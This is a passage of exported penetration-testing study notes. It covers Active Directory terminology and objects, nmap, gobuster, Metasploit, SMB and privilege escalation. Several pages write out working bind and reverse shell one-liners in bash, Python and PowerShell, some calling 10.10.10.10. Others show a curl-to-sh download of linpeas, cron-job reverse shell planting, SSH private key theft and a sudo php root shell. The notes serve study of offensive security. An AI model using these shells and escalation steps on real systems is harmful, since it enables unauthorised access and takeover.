users, they are prime targets for attackers since full administrative access to a computer (as the all-powerful NT AUTHORITY\\SYSTEM account) grants similar rights to a standard domain user and can be used to perform the majority of the enumeration tasks that a user account can (save for a few exceptions across domain trusts.)\nShared Folders\nA shared folder object points to a shared folder on the specific computer where the folder resides. Shared folders can have stringent access control applied to them and can be either accessible to everyone (even those without a valid AD account), open to only authenticated users (which means anyone with even the lowest privileged user account OR a computer account (NT AUTHORITY\\SYSTEM) could access it), or be locked down to only allow certain users/groups access. Anyone not explicitly allowed access will be denied from listing or reading its contents. Shared folders are NOT security principals and only have a GUID. A shared folder’s attributes can include the name, location on the system, security access rights.\nGroups\nA group is considered a container object because it can contain other objects, including users, computers, and even other groups. A group IS regarded as a security principal and has a SID and a GUID. In AD, groups are a way to manage user permissions and access to other securable objects (both users and computers). Let’s say we want to give 20 help desk users access to the Remote Management Users group on a jump host. Instead of adding the users one by one, we could add the group, and the users would inherit the intended permissions via their membership in the group. In Active Directory, we commonly see what are called “nested groups” (a group added as a member of another group), which can lead to a user(s) obtaining unintended rights. Nested group membership is something we see and often leverage during penetration tests. The tool BloodHound helps to discover attack paths within a network and illustrate them in a graphical interface. It is excellent for auditing group membership and uncovering/seeing the sometimes unintended impacts of nested group membership. Groups in AD can have many attributes, the most common being the name, description, membership, and other groups that the group belongs to. Many other attributes can be set, which we will discuss more in-depth later in this module.\nOrganizational Units (OUs)\nAn organizational unit, or OU from here on out, is a container that systems administrators can use to store similar objects for ease of administration. OUs are often used for administrative delegation of tasks without granting a user account full administrative rights. For example, we may have a top-level OU called Employees and then child OUs under it for the various departments such as Marketing, HR, Finance, Help Desk, etc. If an account were given the right to reset passwords over the top-level OU, this user would have the right to reset passwords for all users in the company. However, if the OU structure were such that specific departments were child OUs of the Help Desk OU, then any user placed in the Help Desk OU would have this right delegated to them if granted. Other tasks that may be delegated at the OU level include creating/deleting users, modifying group membership, managing Group Policy links, and performing password resets. OUs are very useful for managing Group Policy (which we will study later in this module) settings across a subset of users and groups within a domain. For example, we may want to set a specific password policy for privileged service accounts so these accounts could be placed in a particular OU and then have a Group Policy object assigned to it, which would enforce this password policy on all accounts placed inside of it. A few OU attributes include its name, members, security settings, and more.\nDomain\nA domain is the structure of an AD network. Domains contain objects such as users and computers, which are organized into container objects: groups and OUs. Every domain has its own separate database and sets of policies that can be applied to any and all objects within the domain. Some policies are set by default (and can be tweaked), such as the domain password policy. In contrast, others are created and applied based on the organization’s need, such as blocking access to cmd.exe for all non-administrative users or mapping shared drives at log in.\nDomain Controllers\nDomain Controllers are essentially the brains of an AD network. They handle authentication requests, verify users on the network, and control who can access the various resources in the domain. All access requests are validated via the domain controller and privileged access requests are based on predetermined roles assigned to users. It also enforces security policies and stores information about every other object in the domain.\nSites\nA site in AD is a set of computers across one or more subnets connected using high-speed links. They are used to make replication across domain controllers run efficiently.\nBuilt-in\nIn AD, built-in is a container that holds default groups in an AD domain. They are predefined when an AD domain is created.\nForeign Security Principals\nA foreign security principal (FSP) is an object created in AD to represent a security principal that belongs to a trusted external forest. They are created when an object such as a user, group, or computer from an external (outside of the current) forest is added to a group in the current domain. They are created automatically after adding a security principal to a group. Every foreign security principal is a placeholder object that holds the SID of the foreign object (an object that belongs to another forest.) Windows uses this SID to resolve the object’s name via the trust relationship. FSPs are created in a specific container named ForeignSecurityPrincipals with a distinguished name like cn=ForeignSecurityPrincipals,dc=inlanefreight,dc=local."},"HTB/AD-Terminologies":{"title":"AD Terminologies","links":["HTB/AD-Functionality","HTB/SMB"],"tags":[],"content":"Reference: HTB\nObject\nAn object can be defined as ANY resource present within an Active Directory environment such as OUs, printers, users, domain controllers, etc.\nAttributes\nEvery object in Active Directory has an associated set of attributes used to define characteristics of the given object. A computer object contains attributes such as the hostname and DNS name. All attributes in AD have an associated LDAP name that can be used when performing LDAP queries, such as displayName for Full Name and given name for First Name.\nSchema\nThe Active Directory schema is essentially the blueprint of any enterprise environment. It defines what types of objects can exist in the AD database and their associated attributes. It lists definitions corresponding to AD objects and holds information about each object. For example, users in AD belong to the class “user,” and computer objects to “computer,” and so on. Each object has its own information (some required to be set and others optional) that are stored in Attributes. When an object is created from a class, this is called instantiation, and an object created from a specific class is called an instance of that class. For example, if we take the computer RDS01. This computer object is an instance of the “computer” class in Active Directory.\nDomain\nA domain is a logical group of objects such as computers, users, OUs, groups, etc. We can think of each domain as a different city within a state or country. Domains can operate entirely independently of one another or be connected via trust relationships.\nForest\nA forest is a collection of Active Directory domains. It is the topmost container and contains all of the AD objects introduced below, including but not limited to domains, users, groups, computers, and Group Policy objects. A forest can contain one or multiple domains and be thought of as a state in the US or a country within the EU. Each forest operates independently but may have various trust relationships with other forests.\nTree\nA tree is a collection of Active Directory domains that begins at a single root domain. A forest is a collection of AD trees. Each domain in a tree shares a boundary with the other domains. A parent-child trust relationship is formed when a domain is added under another domain in a tree. Two trees in the same forest cannot share a name (namespace). Let’s say we have two trees in an AD forest: inlanefreight.local and ilfreight.local. A child domain of the first would be corp.inlanefreight.local while a child domain of the second could be corp.ilfreight.local. All domains in a tree share a standard Global Catalog which contains all information about objects that belong to the tree.\nContainer\nContainer objects hold other objects and have a defined place in the directory subtree hierarchy.\nLeaf\nLeaf objects do not contain other objects and are found at the end of the subtree hierarchy.\nGlobal Unique Identifier (GUID)\nA GUID is a unique 128-bit value assigned when a domain user or group is created. This GUID value is unique across the enterprise, similar to a MAC address. Every single object created by Active Directory is assigned a GUID, not only user and group objects. The GUID is stored in the ObjectGUID attribute. When querying for an AD object (such as a user, group, computer, domain, domain controller, etc.), we can query for its objectGUID value using PowerShell or search for it by specifying its distinguished name, GUID, SID, or SAM account name. GUIDs are used by AD to identify objects internally. Searching in Active Directory by GUID value is probably the most accurate and reliable way to find the exact object you are looking for, especially if the global catalog may contain similar matches for an object name. Specifying the ObjectGUID value when performing AD enumeration will ensure that we get the most accurate results pertaining to the object we are searching for information about. The ObjectGUID property never changes and is associated with the object for as long as that object exists in the domain.\nSecurity principals\nSecurity principals are anything that the operating system can authenticate, including users, computer accounts, or even threads/processes that run in the context of a user or computer account (i.e., an application such as Tomcat running in the context of a service account within the domain). In AD, security principles are domain objects that can manage access to other resources within the domain. We can also have local user accounts and security groups used to control access to resources on only that specific computer. These are not managed by AD but rather by the Security Accounts Manager (SAM).\nSecurity Identifier (SID)\nA security identifier, or SID is used as a unique identifier for a security principal or security group. Every account, group, or process has its own unique SID, which, in an AD environment, is issued by the domain controller and stored in a secure database. A SID can only be used once. Even if the security principle is deleted, it can never be used again in that environment to identify another user or group. When a user logs in, the system creates an access token for them which contains the user’s SID, the rights they have been granted, and the SIDs for any groups that the user is a member of. This token is used to check rights whenever the user performs an action on the computer. There are also well-known SIDs that are used to identify generic users and groups. These are the same across all operating systems. An example is the Everyone group.\nDistinguished Name (DN)\nA Distinguished Name (DN) describes the full path to an object in AD (such as cn=bjones, ou=IT, ou=Employees, dc=inlanefreight, dc=local). In this example, the user bjones works in the IT department of the company Inlanefreight, and his account is created in an Organizational Unit (OU) that holds accounts for company employees. The Common Name (CN) bjones is just one way the user object could be searched for or accessed within the domain.\nRelative Distinguished Name (RDN)\nA Relative Distinguished Name (RDN) is a single component of the Distinguished Name that identifies the object as unique from other objects at the current level in the naming hierarchy. In our example, bjones is the Relative Distinguished Name of the object. AD does not allow two objects with the same name under the same parent container, but there can be two objects with the same RDNs that are still unique in the domain because they have different DNs. For example, the object cn=bjones,dc=dev,dc=inlanefreight,dc=local would be recognized as different from cn=bjones,dc=inlanefreight,dc=local.\n\nsAMAccountName\nThe sAMAccountName is the user’s logon name. Here it would just be bjones. It must be a unique value and 20 or fewer characters.\nuserPrincipalName\nThe userPrincipalName attribute is another way to identify users in AD. This attribute consists of a prefix (the user account name) and a suffix (the domain name) in the format of bjones@inlanefreight.local. This attribute is not mandatory.\nFSMO Roles\nVarious FSMO roles are discussed in detail in AD Functionality chapter.\nIn the early days of AD, if you had multiple Domain Controllers (DC) in an environment, they would fight over which DC gets to make changes, and sometimes changes would not be made properly. Microsoft then implemented “last writer wins,” which could introduce its own problems if the last change breaks things. They then introduced a model in which a single “master” DC could apply changes to the domain while the others merely fulfilled authentication requests. This was a flawed design because if the master DC went down, no changes could be made to the environment until it was restored. To resolve this single point of failure model, Microsoft separated the various responsibilities that a DC can have into Flexible Single Master Operation (FSMO) roles. These give Domain Controllers (DC) the ability to continue authenticating users and granting permissions without interruption (authorization and authentication). There are five FSMO roles: Schema Master and Domain Naming Master (one of each per forest), Relative ID (RID) Master (one per domain), Primary Domain Controller (PDC) Emulator (one per domain), and Infrastructure Master (one per domain). All five roles are assigned to the first DC in the forest root domain in a new AD forest. Each time a new domain is added to a forest, only the RID Master, PDC Emulator, and Infrastructure Master roles are assigned to the new domain. FSMO roles are typically set when domain controllers are created, but sysadmins can transfer these roles if needed. These roles help replication in AD to run smoothly and ensure that critical services are operating correctly. We will walk through each of these roles in detail later in this section.\nGlobal Catalog\nA global catalog (GC) is a domain controller that stores copies of ALL objects in an Active Directory forest. The GC stores a full copy of all objects in the current domain and a partial copy of objects that belong to other domains in the forest. Standard domain controllers hold a complete replica of objects belonging to its domain but not those of different domains in the forest. The GC allows both users and applications to find information about any objects in ANY domain in the forest. GC is a feature that is enabled on a domain controller and performs the following functions:\n\nAuthentication (provided authorization for all groups that a user account belongs to, which is included when an access token is generated)\nObject search (making the directory structure within a forest transparent, allowing a search to be carried out across all domains in a forest by providing just one attribute about an object.)\n\nRead-Only Domain Controller (RODC)\nA Read-Only Domain Controller (RODC) has a read-only Active Directory database. No AD account passwords are cached on an RODC (other than the RODC computer account &amp; RODC KRBTGT passwords.) No changes are pushed out via an RODC’s AD database, SYSVOL, or DNS. RODCs also include a read-only DNS server, allow for administrator role separation, reduce replication traffic in the environment, and prevent SYSVOL modifications from being replicated to other DCs.\nReplication\nReplication happens in AD when AD objects are updated and transferred from one Domain Controller to another. Whenever a DC is added, connection objects are created to manage replication between them. These connections are made by the Knowledge Consistency Checker (KCC) service, which is present on all DCs. Replication ensures that changes are synchronized with all other DCs in a forest, helping to create a backup in case one domain controller fails.\nService Principal Name (SPN)\nA Service Principal Name (SPN) uniquely identifies a service instance. They are used by Kerberos authentication to associate an instance of a service with a logon account, allowing a client application to request the service to authenticate an account without needing to know the account name.\nGroup Policy Object (GPO)\nGroup Policy Objects (GPOs) are virtual collections of policy settings. Each GPO has a unique Global Unique Identifier (GUID). A GPO can contain local file system settings or Active Directory settings. GPO settings can be applied to both user and computer objects. They can be applied to all users and computers within the domain or defined more granularly at the OU level.\nAccess Control List (ACL)\nAn Access Control List (ACL) is the ordered collection of Access Control Entries (ACEs) that apply to an object.\nAccess Control Entries (ACEs)\nEach Access Control Entry (ACE) in an ACL identifies a trustee (user account, group account, or logon session) and lists the access rights that are allowed, denied, or audited for the given trustee.\nDiscretionary Access Control List (DACL)\nDACLs define which security principles are granted or denied access to an object; it contains a list of ACEs. When a process tries to access a securable object, the system checks the ACEs in the object’s DACL to determine whether or not to grant access. If an object does NOT have a DACL, then the system will grant full access to everyone, but if the DACL has no ACE entries, the system will deny all access attempts. ACEs in the DACL are checked in sequence until a match is found that allows the requested rights or until access is denied.\nSystem Access Control Lists (SACL)\nAllows for administrators to log access attempts that are made to secured objects. ACEs specify the types of access attempts that cause the system to generate a record in the security event log.\nFully Qualified Domain Name (FQDN)\nAn FQDN is the complete name for a specific computer or host. It is written with the hostname and domain name in the format [host name].[domain name].[tld]. This is used to specify an object’s location in the tree hierarchy of DNS. The FQDN can be used to locate hosts in an Active Directory without knowing the IP address, much like when browsing to a website such as google.com instead of typing in the associated IP address. An example would be the host DC01 in the domain INLANEFREIGHT.LOCAL. The FQDN here would be DC01.INLANEFREIGHT.LOCAL.\nTombstone\nA tombstone is a container object in AD that holds deleted AD objects. When an object is deleted from AD, the object remains for a set period of time known as the Tombstone Lifetime, and the isDeleted attribute is set to TRUE. Once an object exceeds the Tombstone Lifetime, it will be entirely removed. Microsoft recommends a tombstone lifetime of 180 days to increase the usefulness of backups, but this value may differ across environments. Depending on the DC operating system version, this value will default to 60 or 180 days. If an object is deleted in a domain that does not have an AD Recycle Bin, it will become a tombstone object. When this happens, the object is stripped of most of its attributes and placed in the Deleted Objects container for the duration of the tombstoneLifetime. It can be recovered, but any attributes that were lost can no longer be recovered.\nAD Recycle Bin\nThe AD Recycle Bin was first introduced in Windows Server 2008 R2 to facilitate the recovery of deleted AD objects. This made it easier for sysadmins to restore objects, avoiding the need to restore from backups, restarting Active Directory Domain Services (AD DS), or rebooting a Domain Controller. When the AD Recycle Bin is enabled, any deleted objects are preserved for a period of time, facilitating restoration if needed. Sysadmins can set how long an object remains in a deleted, recoverable state. If this is not specified, the object will be restorable for a default value of 60 days. The biggest advantage of using the AD Recycle Bin is that most of a deleted object’s attributes are preserved, which makes it far easier to fully restore a deleted object to its previous state.\nSYSVOL\nThe SYSVOL folder, or share, stores copies of public files in the domain such as system policies, Group Policy settings, logon/logoff scripts, and often contains other types of scripts that are executed to perform various tasks in the AD environment. The contents of the SYSVOL folder are replicated to all DCs within the environment using File Replication Services (FRS). You can read more about the SYSVOL structure here.\nAdminSDHolder\nThe AdminSDHolder object is used to manage Access Control List (ACL) for members of built-in groups in AD marked as privileged. It acts as a container that holds the Security Descriptor applied to members of protected groups. The SDProp (SD Propagator) process runs on a schedule on the PDC Emulator Domain Controller. When this process runs, it checks members of protected groups to ensure that the correct ACL is applied to them. It runs every hour by default. For example, suppose an attacker is able to create a malicious ACL entry to grant a user certain rights over a member of the Domain Admins group. In that case, unless they modify other settings in AD, these rights will be removed (and they will lose any persistence they were hoping to achieve) when the SDProp process runs on the set interval.\ndsHeuristics\nThe dsHeuristics attribute is a string value set on the Directory Service object used to define multiple forest-wide configuration settings. One of these settings is to exclude built-in groups from the Protected Groups list. Groups in this list are protected from modification via the AdminSDHolder object. If a group is excluded via the dsHeuristics attribute, then any changes that affect it will not be reverted when the SDProp process runs.\nadminCount\nThe adminCount attribute determines whether or not the SDProp process protects a user. If the value is set to 0 or not specified, the user is not protected. If the attribute value is set to 1, the user is protected. Attackers will often look for accounts with the adminCount attribute set to 1 to target in an internal environment. These are often privileged accounts and may lead to further access or full domain compromise.\nActive Directory Users and Computers (ADUC)\nADUC is a GUI console commonly used for managing users, groups, computers, and contacts in AD. Changes made in ADUC can be done via PowerShell as well.\nADSI Edit\nADSI Edit is a GUI tool used to manage objects in AD. It provides access to far more than is available in ADUC and can be used to set or delete any attribute available on an object, add, remove, and move objects as well. It is a powerful tool that allows a user to access AD at a much deeper level. Great care should be taken when using this tool, as changes here could cause major problems in AD.\nsIDHistory\nThis attribute holds any SIDs that an object was assigned previously. It is usually used in migrations so a user can maintain the same level of access when migrated from one domain to another. This attribute can potentially be abused if set insecurely, allowing an attacker to gain prior elevated access that an account had before a migration if SID Filtering (or removing SIDs from another domain from a user’s access token that could be used for elevated access) is not enabled.\nNTDS.DIT\nThe NTDS.DIT file can be considered the heart of Active Directory. It is stored on a Domain Controller at C:\\Windows\\NTDS\\ and is a database that stores AD data such as information about user and group objects, group membership, and, most important to attackers and penetration testers, the password hashes for all users in the domain. Once full domain compromise is reached, an attacker can retrieve this file, extract the hashes, and either use them to perform a pass-the-hash attack or crack them offline using a tool such as Hashcat to access additional resources in the domain. If the setting Store password with reversible encryption is enabled, then the NTDS.DIT will also store the cleartext passwords for all users created or who changed their password after this policy was set. While rare, some organizations may enable this setting if they use applications or protocols that need to use a user’s existing password (and not Kerberos) for authentication.\nMSBROWSE\nMSBROWSE is a Microsoft networking protocol that was used in early versions of Windows-based local area networks (LANs) to provide browsing services. It was used to maintain a list of resources, such as shared printers and files, that were available on the network, and to allow users to easily browse and access these resources.\nIn older version of Windows we could use nbtstat -A ip-address to search for the Master Browser. If we see MSBROWSE it means that’s the Master Browser. Aditionally we could use nltest utility to query a Windows Master Browser for the names of the Domain Controllers.\nToday, MSBROWSE is largely obsolete and is no longer in widespread use. Modern Windows-based LANs use the Server Message Block (SMB) protocol for file and printer sharing, and the Common Internet File System (CIFS) protocol for browsing services."},"HTB/Active-Directory":{"title":"Active Directory","links":["HTB/AD-Terminologies","HTB/AD-Objects","HTB/AD-Functionality"],"tags":[],"content":"References: HTB\nActive Directory Fundamentals\n\nActive Directory provides authentication and  authorization within a Windows domain environment.\nIt is a windows service that allows for centralized management of an organization’s resources, including users, computers, groups, network devices, file shares, group policies, devices, and trusts.\nAD is essentially a sizeable read-only database accessible to all users within the domain, regardless of their privilege level. ANY user account, regardless of their privilege level, can be used to enumerate the domain and hunt for misconfigurations and flaws thoroughly.\n\n\nActive Directory Structure\nReference: HTB\nActive Directory Structure contains top level domains which may be linked together using relations, and have multiple subdomains. When top domains are in relation the subdomains do not necessarily have relation and need specifying if wanted to.\nAD Terminologies\nVarious terminologies related to active directory can be found here. Its a glossary of terms.\nAD Objects\nDifferent Objects in Active Directory\nAD Functionality"},"HTB/Banner-grabbing":{"title":"Banner grabbing","links":["tags/Reconnaissance","Netcat","HTB/Nmap","cURL"],"tags":["Reconnaissance"],"content":"Reconnaissance\nBanner grabbing is a useful technique to fingerprint a service quickly, i.e. to see what is being run at a given port.\nMethods\n1. Using Netcat:\nSyntax:\nnc -nv &lt;host&gt; &lt;port&gt;\n2. Using Nmap\nSyntax\nnmap -sV --script=banner -p&lt;port number&gt; &lt;host&gt;/&lt;port&gt;\n3. Using cURL"},"HTB/Bind-Shell":{"title":"Bind Shell","links":["Netcat"],"tags":[],"content":"Bind shell is opposite of reverse shell. Instead of we listening and target connecting, here target listens and we connect to it.\nBind Shell Commands\nFor Bash\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc -lvp 1234 &gt;/tmp/f\nFor Python\npython -c &#039;exec(&quot;&quot;&quot;import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind((&quot;0.0.0.0&quot;,1234));s1.listen(1);c,a=s1.accept();\\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())&quot;&quot;&quot;)&#039;\nFor Powershell\npowershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &quot;PS &quot; + (pwd).Path + &quot; &quot;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();\nConnecting to target\nWe use Netcat to connect to the port and get connection to the shell.\nUsage\nnc &lt;target ip&gt; &lt;port&gt;\nUpgrading TTY\nUpgrading TTY will allow better interactions with the remote shell.  This can be achieved by mapping our terminal TTY with the remote TTY.\nThere are multiple methods to achieve this. One of them is using python/stty method.\n1. Step 1\npython -c &#039;import pty; pty.spawn(&quot;/bin/bash&quot;)&#039;\n2. Step 2\nHit ctrl+z to background our shell and get back on our local terminal, and input the following stty command, then input fg command to bring netcat shell to foreground. At this point, the terminal will show a blank line. We can hit enter again to get back to our shell.\n$stty raw -echo\n$fg\n \n[Enter]\n[Enter]"},"HTB/FTP":{"title":"FTP","links":["tags/file-transfer"],"tags":["file-transfer"],"content":"tags: file-transfer\nThe FTP server enables a client to exchange files between devices. It also enables clients to manage files remotely by sending file management commands such as delete or rename. To accomplish this, the FTP service uses two different ports to communicate between client and server.\nTo begin an FTP session, control connection requests are sent to the server using destination TCP port 21. When the session is opened, the server uses TCP port 20 to transfer the data files.\nInfo\nThe default port for ftp is 21.\nWe can login as anonymous if not restricted by the owner.\nSyntax:\nftp -p 10.129.42.253\nCommands\n\n?: To see help menu\nGet: To download files to our local system\nPut: To upload file to remote server\nExit: To exit ftp session.\ncd: Change directory\ndir: List directories\nrename: Rename a file/dir\n"},"HTB/Gobuster":{"title":"Gobuster","links":["tags/web","tags/Reconnaissance","HTB/http-codes","HTB/Wordlists","HTB/Seclist"],"tags":["web","Reconnaissance"],"content":"tags: web Reconnaissance\nGobuster is a web enumeration tool.\nDirectory/File Enumeration\nWe can use dir flag for directory enumeration.\nSyntax\n\tgobuster dir -u &lt;url&gt; -w &lt;wordlist&gt;\nIt returns various http codes for each directory which was found and can be accessed manually.\nWe can use various Wordlists for this attack such as /usr/share/wordlists/dirb/common.txt.\nDNS Subdomain Enumeration\nWe can use dns flag for subdomain enumeration. For wordlist we can use Seclist which has lists for subdomains."},"HTB/JavaScript-Deobfuscation":{"title":"JavaScript Deobfuscation","links":["tags/web"],"tags":["web"],"content":"web\nThe js files are minified into .min.js to hide the functions and data. To return them to their original form we have to use a deobsfuscator.\nWe can use Online Deobsfuscator such as de4js to decode the files.\nAfter deobfuscation we can see how functions are implemented, call them using console and so on."},"HTB/Logging":{"title":"Logging","links":["tags/setup"],"tags":["setup"],"content":"setup\nTo display date and time in the terminal we can change the PS1 variable in .bashrc file as follows.\n\nBackup first\n\ncp .bashrc .bashrc.bak\n\nModify the bash\n\necho &#039;export PS1=&quot;-[\\[$(tput sgr0)\\]\\[\\033[38;5;10m\\]\\d\\[$(tput sgr0)\\]-\\[$(tput sgr0)\\]\\[\\033[38;5;10m\\]\\t\\[$(tput sgr0)\\]]-[\\[$(tput sgr0)\\]\\[\\033[38;5;214m\\]\\u\\[$(tput sgr0)\\]@\\[$(tput sgr0)\\]\\[\\033[38;5;196m\\]\\h\\[$(tput sgr0)\\]]-\\n-[\\[$(tput sgr0)\\]\\[\\033[38;5;33m\\]\\w\\[$(tput sgr0)\\]]\\\\$ \\[$(tput sgr0)\\]&quot;&#039; &gt;&gt; .bashrc\nScript - For Linux\nTo start logging terminal session in a file.\nscript &lt;date&gt;-&lt;start_time&gt;-&lt;name&gt;.log\nStart-Transcript - For windows\nStart-Transcript -Path &quot;C:\\Pentesting\\03-21-2021-0200pm-exploitation.log&quot;"},"HTB/Metasploit":{"title":"Metasploit","links":["HTB/Searchsploit"],"tags":[],"content":"Metasploit Framework (MSF) is a tool which contains many built-in exploits for many public vulnerabilities and provides an easy way to use these exploits against vulnerable targets.\nTo use metasploit we need to learn the name of exploit that can be used against the service. this can be done using tools like Searchsploit.\nCommands\n1. msfconsole:\nTo start metasploit\nmsfconsole\n2. search exploit\nsearch exploit &lt;exploit&gt;\ne.g. when we search for exploit eternalblue we get output exploit/windows/smb/ms17_010_psexec along with other details.\n3. use exploit\nuse &lt;full name of exploit&gt;\ne.g. use exploit/windows/smb/ms17_010_psexec\n4. show options\nTo show config items before using an exploit. The items having required value set to zero must be set before running exploit.\n5. set &lt;option&gt;\nTo set value of a option.\nExample:\nset RHOSTS 1.1.1.1\n6. check\nTo check if exploit works without actually compromising the system."},"HTB/Nmap":{"title":"Nmap","links":["tags/Reconnaissance","locate"],"tags":["Reconnaissance"],"content":"Reconnaissance\nParameters\n\n-sC: Run default scripts and obtain more detailed info\n-sV: Version scan\n-p-: Scan all ports\n-T:\n\n-T1: Slowest\n-T5: Physcho\n\n\n-Pn: Ping probe\n-oA: Output all to file\n \n\n\nnmap -oA outputfile 1.1.1.1\n```\nUsage\nnmap -sC -sV 1.1.1.1\nScripts\nThe syntax for running an Nmap script is `nmap —script  -p&lt;port&gt; &lt;host&gt;‘.\n1. We can locate scripts using locate:\nlocate scripts/citrix\n2. Then to run the script:\nnmap --script=&quot;my_script&quot; -p 224 1.1.1.1"},"HTB/Privilege-Escalation":{"title":"Privilege Escalation","links":["reverse-shell","SSH"],"tags":[],"content":"1. Enumeration Scripts\n\nPEAS\n\nLinPEAS\n\n \n\n\ncurl -L github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh\n\t- WinPEAS\n\n# 2. SUDO\nThe `sudo` command can be used to run command to escalate privilege. We can check what `sudo` privilege we have using `sudo -l`. Most commands require user `password` but some can be ran as root without entering user password. These applications have `NOPASSWD` entry.\n```shell\n$ sudo -l\n\n    (user : user) NOPASSWD: /bin/echo\n\nWe can run that command using the shown user without entering password:\n$ sudo -u user /bin/echo Hello World!\n \n    Hello World!\nThis process can be automated using tools such as GTFObins for Linux and LOLBAS for windows.\n3. Scheduled Tasks\nThere are usually two ways to take advantage of scheduled tasks (Windows) or cron jobs (Linux) to escalate our privileges:\n\nAdd new scheduled tasks/cron jobs\nTrick them to execute a malicious software\n\nThere are specific directories that we may be able to utilize to add new cron jobs if we have the write permissions over them. These include:\n\n/etc/crontab\n/etc/cron.d\n/var/spool/cron/crontabs/root\n\nIf we can write to a directory called by a cron job, we can write a bash script with a reverse shell command, which should send us a reverse shell when executed.\n4. Exposed Credentials\nWe can also find user passwords exposed in configuration files, logs and history files (bash_history) if we have read access to them.\n5. SSH Keys\nIf we have access to .ssh directory, we can read private keys found in /home/user/.ssh/id_rsa or /root/.ssh/id_rsa,  we can copy it to our machine and use the -i flag to log in with it:\nvim id_rsa\nchmod 600 id_rsa\nssh root@10.10.10.10 -i id_rsa\nCommands for specific applicaton\nPHP\nSummon bash\nsudo php -r &#039;system(&quot;/bin/bash&quot;);&#039;"},"HTB/Remote-Shells":{"title":"Remote Shells","links":["HTB/Reverse-Shell","HTB/Bind-Shell","HTB/Web-Shell"],"tags":[],"content":"Types of Remote Shell\n1. Reverse Shell\nConnects back to our system and gives us control through a reverse connection.\n2. Bind Shell\nWaits for us to connect to it and gives us control once we do.\n3. Web Shell\nCommunicates through a web server, accepts our commands through HTTP parameters, executes them, and prints back the output."},"HTB/Reverse-Shell":{"title":"Reverse Shell","links":["Netcat"],"tags":[],"content":"Netcat Listener\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nFlagDescription-lListen mode, to wait for a connection to connect to us.-vVerbose mode, so that we know when we receive a connection.-nDisable DNS resolution and only connect from/to IPs, to speed up the connection.-p 1234Port number netcat is listening on, and the reverse connection should be sent to.\nUsage\nnc -nvlp &lt;port&gt;\nReverse Shell Commands\nFor bash\nbash -c &#039;bash -i &gt;&amp; /dev/tcp/10.10.10.10/1234 0&gt;&amp;1&#039;\nFor bash\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.10 1234 &gt;/tmp/f\nFor Powershell\npowershell -nop -c &quot;$client = New-Object System.Net.Sockets.TCPClient(&#039;10.10.10.10&#039;,1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2&gt;&amp;1 | Out-String );$sb2 = $sb + &#039;PS &#039; + (pwd).Path + &#039;&gt; &#039;;$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()&quot;"},"HTB/SID":{"title":"SID","links":["tags/windows","HTB/Security-Group"],"tags":["windows"],"content":"tags: windows\nSID is a unique identifier of a user which is assigned when a user logs in and has all permissions assigned to it.\ne.g. S-1-5-21-2614195641-1726409526-3792725429-1006\nFinding SID\nCurrent user\nSID of current user can be found using the whoami command.\nwhoami /user\nOther users\nBut for user not logged in, we need to user Get-WmiObject Command.\n Get-WmiObject -Class Win32_UserAccount -filter &quot;name=&#039;Jim&#039;&quot;\nOR\n(Get-Localuser username).SID\nFor Security Group\nGet-WMIObject win32_group -filter &quot;name=&#039;NameOfGroup&#039;&quot;\nOR\n(Get-Localgroup $GroupName).SID"},"HTB/SMB":{"title":"SMB","links":["tags/windows","tags/file-transfer","HTB/Nmap","HTB/Smbclient"],"tags":["windows","file-transfer"],"content":"windows file-transfer\nServer Message Block (SMB)\nEnumerating SMB\nNmap has many scripts for enumerating smb such as smb-os-discovery.nse\nnmap --script smb-os-discovery.nse 1.1.1.1\nShares\nSo smb allows users to share folders (hence called shares) which can be accessed and enumerated using Smbclient in linux."},"HTB/Searchsploit":{"title":"Searchsploit","links":["HTB/Metasploit"],"tags":[],"content":"Searchsploit is a tool used to search for public vulnerabilities against a service which can then be used in Metasploit to attack the target\nInstallation\nsudo apt install exploitdb -y\nUsage\nsearchsploit &lt;application&gt; &lt;version&gt;\nExample\nsearchsploit openssh 7.2"},"HTB/Seclist":{"title":"Seclist","links":["HTB/Wordlists"],"tags":[],"content":"Seclist is a Wordlists repository.\nInstallation\n1. Using Git\ngit clone github.com/danielmiessler/SecLists\n2. Using apt\nsudo apt install seclists -y"},"HTB/Security-Group":{"title":"Security Group","links":["tags/windows"],"tags":["windows"],"content":"tags: windows\nIn Windows, groups can be defined to better manage permissions of users\nCreating a security group\nNew-LocalGroup -Name &quot;Group1&quot; -Description &quot;The new group&quot;\nAdd users to the group\nAdd-LocalGroupMember -Name Group1 -Member Jim"},"HTB/Services":{"title":"Services","links":["tags/windows"],"tags":["windows"],"content":"tags: windows\nWindows services are programs that run in the background.\nTo list services\nGet-Service | Where-Object {$_.Status -eq &quot;Running&quot;}\nOutput to a csv file\nGet-Service | Out-File -FilePath &quot;Services.txt&quot;"},"HTB/Smbclient":{"title":"Smbclient","links":["HTB/SMB","tags/file-transfer"],"tags":["file-transfer"],"content":"References: SMB\nTags: file-transfer\nsmbclient is a tool to enumerate and interact with smb shares.\nFlags\n\n-N : suppress password prompt\n-L : list available shares\n\nCommand\nsmbclient -N -L \\\\\\\\1.1.1.1\nConnecting to a share\n1. Connect as a 